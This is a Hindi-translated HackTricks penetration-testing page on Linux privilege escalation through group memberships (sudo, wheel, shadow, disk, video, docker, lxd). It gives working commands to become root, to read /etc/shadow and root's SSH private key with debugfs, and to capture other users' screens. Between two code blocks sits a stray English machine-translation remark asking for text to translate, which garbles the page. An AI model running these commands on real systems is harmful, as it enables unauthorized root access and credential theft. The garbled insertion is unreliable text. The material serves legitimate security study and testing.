<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>


# Sudo/Admin समूह

## **PE - विधि 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से \(या क्योंकि कुछ सॉफ़्टवेयर को इसकी आवश्यकता होती है\)** **/etc/sudoers** फ़ाइल के अंदर आपको ये पंक्तियाँ मिल सकती हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **sudo या admin समूह का कोई भी सदस्य कुछ भी sudo के रूप में निष्पादित कर सकता है**।

यदि ऐसा है, तो **root बनने के लिए आप बस निम्नलिखित निष्पादित कर सकते हैं**:
```text
sudo su
```
## PE - विधि 2

सभी suid बाइनरीज़ को ढूंढें और जांचें कि क्या **Pkexec** बाइनरी मौजूद है:
```bash
find / -perm -4000 2>/dev/null
```
यदि आप पाते हैं कि बाइनरी pkexec एक SUID बाइनरी है और आप sudo या admin समूह के सदस्य हैं, तो आप pkexec का उपयोग करके संभवतः बाइनरीज़ को sudo के रूप में निष्पादित कर सकते हैं।
निम्नलिखित की सामग्री की जाँच करें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहां आपको पता चलेगा कि किन समूहों को **pkexec** निष्पादित करने की अनुमति है और **डिफ़ॉल्ट रूप से** कुछ लिनक्स में **प्रकट** हो सकते हैं कुछ समूह **sudo या admin**.

**रूट बनने के लिए आप निष्पादित कर सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** निष्पादित करने का प्रयास करते हैं और आपको यह **error** मिलती है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**यह इसलिए नहीं है क्योंकि आपके पास अनुमतियां नहीं हैं, बल्कि इसलिए है क्योंकि आप GUI के बिना जुड़े नहीं हैं**। और इस समस्या के लिए यहाँ एक समाधान है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग-अलग ssh सत्रों** की आवश्यकता है:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
The provided text seems to be part of a markdown file with code block syntax, but there is no actual content to translate. The text only includes closing and opening tags for code blocks in markdown. Please provide the English text that needs to be translated into Hindi, and I will translate it while maintaining the original markdown and HTML syntax.
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**कभी-कभी**, **डिफ़ॉल्ट रूप से** **/etc/sudoers** फ़ाइल के अंदर आप यह पंक्ति पा सकते हैं:
```text
%wheel	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **जो भी उपयोगकर्ता wheel समूह का हिस्सा है वह सब कुछ sudo के रूप में निष्पादित कर सकता है**।

यदि ऐसा है, तो **root बनने के लिए आप बस निम्नलिखित निष्पादित कर सकते हैं**:
```text
sudo su
```
# शैडो समूह

**ग्रुप शैडो** के उपयोगकर्ता **/etc/shadow** फाइल को **पढ़** सकते हैं:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
इसलिए, फाइल को पढ़ें और **कुछ हैशेस को क्रैक करने की** कोशिश करें।

# डिस्क समूह

यह विशेषाधिकार लगभग **रूट एक्सेस के बराबर** है क्योंकि आप मशीन के अंदर के सभी डेटा तक पहुँच सकते हैं।

फाइलें:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फाइलें लिख** भी सकते हैं। उदाहरण के लिए `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप यह कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
हालांकि, यदि आप **root द्वारा स्वामित्व वाली फाइलों को लिखने का प्रयास करते हैं** \(जैसे `/etc/shadow` या `/etc/passwd`\) तो आपको "**Permission denied**" त्रुटि मिलेगी।

# वीडियो समूह

आदेश `w` का उपयोग करके आप पता लगा सकते हैं **सिस्टम पर कौन लॉग इन है** और इससे निम्नलिखित जैसा आउटपुट दिखाई देगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** का मतलब है कि उपयोगकर्ता **yossi मशीन पर भौतिक रूप से एक टर्मिनल में लॉग इन है।**

**video group** को स्क्रीन आउटपुट देखने की पहुंच होती है। मूल रूप से आप स्क्रीन्स को देख सकते हैं। इसके लिए आपको स्क्रीन पर मौजूदा छवि को कच्चे डेटा में **पकड़ना होगा** और स्क्रीन जिस रेजोल्यूशन का उपयोग कर रही है उसे प्राप्त करना होगा। स्क्रीन डेटा को `/dev/fb0` में सहेजा जा सकता है और आप इस स्क्रीन के रेजोल्यूशन को `/sys/class/graphics/fb0/virtual_size` पर ढूंढ सकते हैं।
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
कच्ची छवि को **खोलने** के लिए आप **GIMP** का उपयोग कर सकते हैं, **`screen.raw`** फ़ाइल का चयन करें और फ़ाइल प्रकार के रूप में **कच्ची छवि डेटा** का चयन करें:

![](../../.gitbook/assets/image%20%28208%29.png)

फिर स्क्रीन पर उपयोग किए गए चौड़ाई और ऊंचाई को संशोधित करें और विभिन्न छवि प्रकारों की जांच करें \(और वह चुनें जो स्क्रीन को बेहतर दिखाता है\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Group

ऐसा लगता है कि डिफ़ॉल्ट रूप से **root group के सदस्यों** को कुछ **सेवा** कॉन्फ़िगरेशन फ़ाइलों या कुछ **लाइब्रेरीज़** फ़ाइलों या **अन्य दिलचस्प चीजों** को संशोधित करने की पहुंच हो सकती है जिनका उपयोग विशेषाधिकार बढ़ाने के लिए किया जा सकता है...

**जांचें कि root सदस्य कौन सी फ़ाइलें संशोधित कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker समूह

आप मेजबान मशीन की रूट फाइल सिस्टम को एक इंस्टेंस के वॉल्यूम में माउंट कर सकते हैं, इसलिए जब इंस्टेंस शुरू होता है तो यह तुरंत उस वॉल्यूम में `chroot` लोड करता है। यह आपको मशीन पर रूट प्रदान करता है।

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd समूह

[lxc - विशेषाधिकार वृद्धि](lxd-privilege-escalation.md)



<details>

<summary><strong>AWS हैकिंग सीखें शून्य से नायक तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** को अपनी हैकिंग ट्रिक्स साझा करके PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में **योगदान दें**.

</details>
